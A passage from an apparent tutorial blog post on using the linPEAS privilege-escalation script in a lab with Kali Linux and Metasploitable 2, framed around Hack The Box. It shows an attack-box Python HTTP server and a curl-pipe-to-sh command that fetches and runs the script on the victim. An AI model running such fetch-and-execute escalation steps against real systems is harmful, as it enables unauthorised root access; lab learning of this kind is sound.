### 2. **My Setup**

For running the linPEAS tool, I used Kali Linux in a VMware Workstation 16 Player virtualized environment.

For my vulnerable host, I am using the Metasploitable 2 instance running in a VMWare Workstation 16 Player virtualized environment.

### 3. **What is linPEAS?**

linPEAS is an awesome script developed by Carlos Polop that finds privilege escalation points in Linux. He also developed winPEAS and macPEAS for Windows and Macintosh respectfully.

### 4. **Why use linPEAS?**

Imagine you are hacking one of the Linux machines on Hack The Box and you finally are logged in as a user. You obtained the user flag, but still need to get the root flag. Since as a user you likely have some privileges you can use linPEAS to determine how you can escalate your privileges to root. 

Everyone that has done Hack The Box knows that the Root flag is always the one that gives the attacker the most thrill of achieving.

### 5. **How to use linPEAS?**

For this scenario the following are assumed:

1 . I have gained access to a vulnerable Linux device as a non-root user. I will have my access through SSH.

2 . I have enough permissions to run a script as the user on the Linux device.

Please check out the different ways to get the linPEAS script onto the victim device [here](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS#quick-start).

    Step 1:
    I am going to host the linPEAS script on my attack box using a Python3 http server.

    python3 -m http.server 8989

<br>

    Step 2:
    In my SSH shell I am going to use curl to grab the script from my HTTP server.

    curl <IP_ADDRESS OF KALI>:8989/linpeas.sh | sh
